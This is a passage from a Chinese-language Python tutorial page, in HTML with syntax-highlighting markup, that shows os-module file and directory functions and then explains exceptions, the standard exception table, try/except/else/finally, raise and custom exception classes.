class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前工作目录为 %s\"</span> <span class=\"token operator\">%</span> retval<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前工作目录 : %s\"</span> <span class=\"token operator\">%</span> os<span class=\"token punctuation\">.</span>getcwdb<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 当前工作目录为 F:\\</span>\n\n<span class=\"token comment\"># 修改当前工作目录</span>\nos<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 查看修改后的工作目录</span>\nretval <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"目录修改成功 %s\"</span> <span class=\"token operator\">%</span> retval<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 目录修改成功 D:\\</span>\n\n\n<span class=\"token comment\"># path = '/tmp/foo.txt'</span>\n<span class=\"token comment\"># # 为文件设置标记，使得它不能被重命名和删除</span>\n<span class=\"token comment\"># flags = stat.SF_NOUNLINK</span>\n<span class=\"token comment\"># retval = os.chflags(path, flags)</span>\n<span class=\"token comment\"># print(\"返回值: %s\" % retval)</span>\n\n\npath <span class=\"token operator\">=</span> <span class=\"token string\">'D:/test.txt'</span>\n<span class=\"token keyword\">import</span> os<span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">,</span> stat\n\n<span class=\"token comment\"># 设置文件可以通过用户组执行</span>\nos<span class=\"token punctuation\">.</span>chmod<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> stat<span class=\"token punctuation\">.</span>S_IXGRP<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 设置文件可以被其他用户写入</span>\nos<span class=\"token punctuation\">.</span>chmod<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> stat<span class=\"token punctuation\">.</span>S_IWOTH<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改成功!!\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 设置所有者 ID 为 100</span>\n<span class=\"token comment\"># os.chown(\"/tmp/foo.txt\", 100, -1)</span>\n<span class=\"token comment\"># print(\"修改权限成功!!\")</span>\n\n\n<span class=\"token comment\"># 设置根目录为 /tmp</span>\n<span class=\"token comment\"># os.chroot(\"/tmp\")</span>\n<span class=\"token comment\"># print(\"修改根目录成功!!\")</span>\n\n\n<span class=\"token comment\"># 打开文件</span>\n<span class=\"token comment\"># fd = os.open(\"foo.txt\", os.O_RDWR | os.O_CREAT)</span>\n<span class=\"token comment\"># #  写入字符串</span>\n<span class=\"token comment\"># os.write(fd, \"This is test\")</span>\n<span class=\"token comment\"># d_fd = os.dup( fd )</span>\n<span class=\"token comment\"># # 关闭文件</span>\n<span class=\"token comment\"># os.close(fd)</span>\n<span class=\"token comment\"># print(\"关闭文件成功!!\")</span>\n\n\n<span class=\"token comment\"># 创建的目录</span>\n<span class=\"token comment\"># path = \"/tmp/home/monthly/daily/hourly\"</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># os.mkdir(path, 0o755)</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># print(\"目录已创建\")</span>\n\n\n<span class=\"token comment\"># 创建的目录</span>\n<span class=\"token comment\"># path = \"/tmp/hourly\"</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># os.mkfifo(path, 0o644)</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># print(\"路径被创建\")</span>\n\n\n<span class=\"token comment\"># # 列出目录</span>\n<span class=\"token comment\"># print(\"目录为: %s\" % os.listdir(os.getcwd()))</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 移除</span>\n<span class=\"token comment\"># os.remove(\"aa.txt\")</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 移除后列出目录</span>\n<span class=\"token comment\"># print(\"移除后 : %s\" % os.listdir(os.getcwd()))</span>\n\n\n<span class=\"token comment\"># os.renames(old, new)</span>\n\n\n<span class=\"token comment\"># # 列出目录</span>\n<span class=\"token comment\"># print(\"目录为: %s\"%os.listdir(os.getcwd()))</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 删除路径</span>\n<span class=\"token comment\"># os.rmdir(\"mydir\")</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 列出重命名后的目录</span>\n<span class=\"token comment\"># print(\"目录为: %s\" %os.listdir(os.getcwd())</span>\n\n\n<span class=\"token comment\"># # 显示文件 \"a2.py\" 信息</span>\n<span class=\"token comment\"># statinfo = os.stat('a2.py')</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># print(statinfo)</span>\n\n\n<span class=\"token comment\"># # 打开文件</span>\n<span class=\"token comment\"># fd = os.open(\"f1.txt\", os.O_RDWR | os.O_CREAT)</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 写入字符串</span>\n<span class=\"token comment\"># str = \"This is runoob.com site\"</span>\n<span class=\"token comment\"># ret = os.write(fd, bytes(str, 'UTF-8'))</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 输入返回值</span>\n<span class=\"token comment\"># print(\"写入的位数为: \")</span>\n<span class=\"token comment\"># print(ret)</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># print(\"写入成功\")</span>\n<span class=\"token comment\">#</span>\n<span class=\"token comment\"># # 关闭文件</span>\n<span class=\"token comment\"># os.close(fd)</span>\n<span class=\"token comment\"># print(\"关闭文件成功!!\")</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"错误和异常\"><a href=\"#错误和异常\" class=\"headerlink\" title=\"错误和异常\"></a>错误和异常</h2><h3 id=\"语法错误\"><a href=\"#语法错误\" class=\"headerlink\" title=\"语法错误\"></a>语法错误</h3><p>一般为漏写符号，或者拼写错误报错</p>\n<p>语法分析器指出了出错的一行，并且在最先找到的错误的位置标记一个小小的箭头</p>\n<h3 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h3><p>即便 Python 程序的语法是正确的，在运行它的时候，也有可能发生错误。运行期检测到的错误被称为异常</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">/</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 除数不能为0报异常</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 类型不能相加，触发异常</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"python标准异常\"><a href=\"#python标准异常\" class=\"headerlink\" title=\"python标准异常\"></a>python标准异常</h3><table>\n<thead>\n<tr>\n<th align=\"left\">异常名称</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"></td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"left\">BaseException</td>\n<td align=\"left\">所有异常的基类</td>\n</tr>\n<tr>\n<td align=\"left\">SystemExit</td>\n<td align=\"left\">解释器请求退出</td>\n</tr>\n<tr>\n<td align=\"left\">KeyboardInterrupt</td>\n<td align=\"left\">用户中断执行(通常是输入^C)</td>\n</tr>\n<tr>\n<td align=\"left\">Exception</td>\n<td align=\"left\">常规错误的基类</td>\n</tr>\n<tr>\n<td align=\"left\">StopIteration</td>\n<td align=\"left\">迭代器没有更多的值</td>\n</tr>\n<tr>\n<td align=\"left\">GeneratorExit</td>\n<td align=\"left\">生成器(generator)发生异常来通知退出</td>\n</tr>\n<tr>\n<td align=\"left\">StandardError</td>\n<td align=\"left\">所有的内建标准异常的基类</td>\n</tr>\n<tr>\n<td align=\"left\">ArithmeticError</td>\n<td align=\"left\">所有数值计算错误的基类</td>\n</tr>\n<tr>\n<td align=\"left\">FloatingPointError</td>\n<td align=\"left\">浮点计算错误</td>\n</tr>\n<tr>\n<td align=\"left\">OverflowError</td>\n<td align=\"left\">数值运算超出最大限制</td>\n</tr>\n<tr>\n<td align=\"left\">ZeroDivisionError</td>\n<td align=\"left\">除(或取模)零 (所有数据类型)</td>\n</tr>\n<tr>\n<td align=\"left\">AssertionError</td>\n<td align=\"left\">断言语句失败</td>\n</tr>\n<tr>\n<td align=\"left\">AttributeError</td>\n<td align=\"left\">对象没有这个属性</td>\n</tr>\n<tr>\n<td align=\"left\">EOFError</td>\n<td align=\"left\">没有内建输入,到达EOF 标记</td>\n</tr>\n<tr>\n<td align=\"left\">EnvironmentError</td>\n<td align=\"left\">操作系统错误的基类</td>\n</tr>\n<tr>\n<td align=\"left\">IOError</td>\n<td align=\"left\">输入/输出操作失败</td>\n</tr>\n<tr>\n<td align=\"left\">OSError</td>\n<td align=\"left\">操作系统错误</td>\n</tr>\n<tr>\n<td align=\"left\">WindowsError</td>\n<td align=\"left\">系统调用失败</td>\n</tr>\n<tr>\n<td align=\"left\">ImportError</td>\n<td align=\"left\">导入模块/对象失败</td>\n</tr>\n<tr>\n<td align=\"left\">LookupError</td>\n<td align=\"left\">无效数据查询的基类</td>\n</tr>\n<tr>\n<td align=\"left\">IndexError</td>\n<td align=\"left\">序列中没有此索引(index)</td>\n</tr>\n<tr>\n<td align=\"left\">KeyError</td>\n<td align=\"left\">映射中没有这个键</td>\n</tr>\n<tr>\n<td align=\"left\">MemoryError</td>\n<td align=\"left\">内存溢出错误(对于Python 解释器不是致命的)</td>\n</tr>\n<tr>\n<td align=\"left\">NameError</td>\n<td align=\"left\">未声明/初始化对象 (没有属性)</td>\n</tr>\n<tr>\n<td align=\"left\">UnboundLocalError</td>\n<td align=\"left\">访问未初始化的本地变量</td>\n</tr>\n<tr>\n<td align=\"left\">ReferenceError</td>\n<td align=\"left\">弱引用(Weak reference)试图访问已经垃圾回收了的对象</td>\n</tr>\n<tr>\n<td align=\"left\">RuntimeError</td>\n<td align=\"left\">一般的运行时错误</td>\n</tr>\n<tr>\n<td align=\"left\">NotImplementedError</td>\n<td align=\"left\">尚未实现的方法</td>\n</tr>\n<tr>\n<td align=\"left\">SyntaxError</td>\n<td align=\"left\">Python 语法错误</td>\n</tr>\n<tr>\n<td align=\"left\">IndentationError</td>\n<td align=\"left\">缩进错误</td>\n</tr>\n<tr>\n<td align=\"left\">TabError</td>\n<td align=\"left\">Tab 和空格混用</td>\n</tr>\n<tr>\n<td align=\"left\">SystemError</td>\n<td align=\"left\">一般的解释器系统错误</td>\n</tr>\n<tr>\n<td align=\"left\">TypeError</td>\n<td align=\"left\">对类型无效的操作</td>\n</tr>\n<tr>\n<td align=\"left\">ValueError</td>\n<td align=\"left\">传入无效的参数</td>\n</tr>\n<tr>\n<td align=\"left\">UnicodeError</td>\n<td align=\"left\">Unicode 相关的错误</td>\n</tr>\n<tr>\n<td align=\"left\">UnicodeDecodeError</td>\n<td align=\"left\">Unicode 解码时的错误</td>\n</tr>\n<tr>\n<td align=\"left\">UnicodeEncodeError</td>\n<td align=\"left\">Unicode 编码时错误</td>\n</tr>\n<tr>\n<td align=\"left\">UnicodeTranslateError</td>\n<td align=\"left\">Unicode 转换时错误</td>\n</tr>\n<tr>\n<td align=\"left\">Warning</td>\n<td align=\"left\">警告的基类</td>\n</tr>\n<tr>\n<td align=\"left\">DeprecationWarning</td>\n<td align=\"left\">关于被弃用的特征的警告</td>\n</tr>\n<tr>\n<td align=\"left\">FutureWarning</td>\n<td align=\"left\">关于构造将来语义会有改变的警告</td>\n</tr>\n<tr>\n<td align=\"left\">OverflowWarning</td>\n<td align=\"left\">旧的关于自动提升为长整型(long)的警告</td>\n</tr>\n<tr>\n<td align=\"left\">PendingDeprecationWarning</td>\n<td align=\"left\">关于特性将会被废弃的警告</td>\n</tr>\n<tr>\n<td align=\"left\">RuntimeWarning</td>\n<td align=\"left\">可疑的运行时行为(runtime behavior)的警告</td>\n</tr>\n<tr>\n<td align=\"left\">SyntaxWarning</td>\n<td align=\"left\">可疑的语法的警告</td>\n</tr>\n<tr>\n<td align=\"left\">UserWarning</td>\n<td align=\"left\">用户代码生成的警告</td>\n</tr>\n</tbody></table>\n<h3 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h3><h5 id=\"try-except\"><a href=\"#try-except\" class=\"headerlink\" title=\"try/except\"></a>try/except</h5><p>基本格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    执行代码\n<span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n    异常时执行的代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        x <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入一个数字: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"您输入的不是数字，请再次尝试输入！\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n请输入一个数字: qq\n您输入的不是数字，请再次尝试输入！\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>首先执行try字句</li>\n<li>没有异常忽略except，结束try</li>\n<li>如果有异常，忽略try语句发生异常后面的语句，执行与except中与try发生的异常相符的语句</li>\n<li>如果没有相符的，那么这个异常将会传递给上层的 try 中</li>\n</ol>\n<p>一个except语句同时处理多个异常，这些异常将被放在一个括号里成为一个元组</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">except</span> <span class=\"token punctuation\">(</span>RuntimeError<span class=\"token punctuation\">,</span> TypeError<span class=\"token punctuation\">,</span> NameError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n\n<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'myfile.txt'</span><span class=\"token punctuation\">)</span>\n    s <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> OSError <span class=\"token keyword\">as</span> err<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OS error: {0}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Could not convert data to an integer.\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unexpected error:\"</span><span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>exc_info<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">raise</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"try-except…else\"><a href=\"#try-except…else\" class=\"headerlink\" title=\"try/except…else\"></a>try/except…else</h5><p>基本格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    执行代码\n<span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n    异常时执行的代码\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    没有异常执行的代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> arg <span class=\"token keyword\">in</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> IOError<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cannot open'</span><span class=\"token punctuation\">,</span> arg<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">,</span> <span class=\"token string\">'has'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'lines'</span><span class=\"token punctuation\">)</span>\n        f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"try-finally-语句\"><a href=\"#try-finally-语句\" class=\"headerlink\" title=\"try-finally 语句\"></a>try-finally 语句</h5><p>基本格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    执行代码\n<span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n    异常时执行的代码\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    没有异常执行的代码\n<span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span>\n    无论如何都要执行的代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    runoob<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> AssertionError <span class=\"token keyword\">as</span> error<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'file.log'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n            read_data <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> FileNotFoundError <span class=\"token keyword\">as</span> fnf_error<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fnf_error<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这句话，无论异常是否发生都会执行。'</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\n这句话，无论异常是否发生都会执行。\nTraceback (most recent call last):\n  File xxxx in &lt;module&gt;\n    runoob()\nNameError: name 'runoob' is not defined\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"抛出异常\"><a href=\"#抛出异常\" class=\"headerlink\" title=\"抛出异常\"></a>抛出异常</h3><p> 使用 raise 语句抛出一个指定的异常</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">raise</span> <span class=\"token punctuation\">[</span>Exception <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> args <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> traceback<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">x <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\n<span class=\"token keyword\">if</span> x <span class=\"token operator\">&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'x 不能大于 5。x 的值为: {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nTraceback (most recent call last):\n  File xxx in &lt;module&gt;\n    raise Exception('x 不能大于 5。x 的值为: {}'.format(x))\nException: x 不能大于 5。x 的值为: 10\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> NameError<span class=\"token punctuation\">(</span><span class=\"token string\">'HiThere'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> NameError<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'An exception flew by!'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">raise</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nTraceback (most recent call last):\n  File xxxx in &lt;module&gt;\n    raise NameError('HiThere')\nNameError: HiThere\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"用户自定义异常\"><a href=\"#用户自定义异常\" class=\"headerlink\" title=\"用户自定义异常\"></a>用户自定义异常</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyError</span><span class=\"token punctuation\">(</span>Exception<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> MyError<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> MyError <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'My exception occurred, value:'</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">raise</span> MyError<span class=\"token punctuation\">(</span><span class=\"token string\">'oops!'</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nTraceback (most recent call last):\n  File xxx in &lt;module&gt;\n    raise MyError('oops!')\n__main__.MyError: 'oops!'\nMy exception occurred, value: 4\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"定义清理行为\"><a href=\"#定义清理行为\" class=\"headerlink\" title=\"定义清理行为\"></a>定义清理行为</h3><p>不管 try 子句里面有没有发生异常，finally 子句都会执行</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> KeyboardInterrupt\n<span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Goodbye, world!'</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nTraceback (most recent call last):\n  File xxx in &lt;module&gt;\n    raise KeyboardInterrupt\nKeyboardInterrupt\nGoodbye, world!\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"预定义的清理行为\"><a href=\"#预定义的清理行为\" class=\"headerlink\" title=\"预定义的清理行为\"></a>预定义的清理行为</h3><p>一些对象定义了标准的清理行为，无论系统是否成功的使用了它，一旦不需要它了，那么这个标准的清理行为就会执行</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"myfile.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>line<span class=\"token 